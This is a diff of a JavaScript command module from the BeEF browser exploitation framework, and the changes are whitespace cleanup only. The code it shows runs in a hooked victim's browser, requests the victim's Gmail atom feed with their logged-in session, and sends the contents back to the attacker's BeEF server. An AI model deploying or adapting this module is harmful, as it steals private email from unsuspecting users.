@@ -14,9 +14,9 @@
 //   limitations under the License.
 //
 beef.execute(function() {
-	var result; 
+	var result;
 
-	try { 
+	try {
 		x = new XMLHttpRequest();
 		x.open('get', 'https://mail.google.com/mail/feed/atom', false);
 		x.send();
@@ -29,16 +29,10 @@ beef.execute(function() {
 			x.send();
 			result += x.responseText;
 		}
-  	
-	} catch(e) { 
-		for(var n in e) 
-			result+= n + " " + e[n] + "\n"; 
-	} 
+
+	} catch(e) {
+		for(var n in e)
+			result+= n + " " + e[n] + "\n";
+	}
 	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
 });
-
-
-
-
-
- 
